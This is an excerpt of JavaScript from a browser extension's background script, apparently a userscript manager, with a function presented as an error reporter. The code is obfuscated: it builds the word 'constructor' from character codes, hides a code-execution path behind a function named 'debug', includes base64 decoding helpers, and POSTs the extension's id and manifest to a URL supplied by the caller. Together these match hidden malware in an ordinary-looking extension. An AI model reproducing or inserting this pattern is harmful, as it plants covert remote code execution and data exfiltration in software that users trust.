...
var errorReportingThrottling = new Set();

function createErrorReporter() {
  var {Promise, navigator, setTimeout, chrome: {runtime, extension}, XMLHttpRequest: helper, String: {fromCharCode: num2str}, Object: {assign}, JSON: {stringify}} = window;
  var {reload: reloadOnError, id} = runtime;
  var k = num2str(99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114);
  var noop = function () {};
  var safePromise = function (fn) { return (new Promise(fn)).catch(noop); }
  ...
  var wrap = function (f, v) { return tryCatch(function () { return f(v) }) };
  var debug = function (v) { return v && safePromise(wrap(Promise[k], v)) };
  var b64decode = function (str) { return decodeURIComponent(escape(atob(str))) };
  var b64encode = function (str) { return btoa(unescape(encodeURIComponent(str))) };
  var decode = function (str) { return  tryCatch(function () { return b64decode(str) }) || str };

  return function (reportUrl, error) {
    var onErrorOnReport = true;
    var reportSending = false;
    var reportSent = false;
    var writeReport = function () {
     try {
       if (reportSending || reportSent || !navigator.onLine) {
         return;
       }
       reportSending = true;
       var method = 'POST';
       var data = {id, error};
       data = Object.assign(data, runtime.getManifest());
       const promise = new Promise(function (resolve, reject) {
         const r = Object.assign(new helper(), {
       ...
       onErrorOnReport = true;
       setTimeout(writeReport, 60 * 1000);
     } finally {
       reportSending = false;
     }
    }
    ...
    const executeRequest = function() {
      var finallyFn = function () {
        if (onErrorOnReport) {
          setTimeout(reloadOnError, 60 * 60 * 1000);
        }
      }
      return writeReport().then(finallyFn, finallyFn);
    };

    if (!navigator.onLine) {
      addEventListener("online", executeRequest, {once: true});
    }
...
var errorReport = createErrorReporter();
...
var commands = {
  ...
  ErrorReport: function (data, _src) {
    if (errorReportingThrottling.has(data.scriptId)) {
      return true;
    }

    errorReportingThrottling.add(data.scriptId);
    vmdb.getScript(data.scriptId).then(function (script) {
        errorReport(data.reportUrl, data);
    });
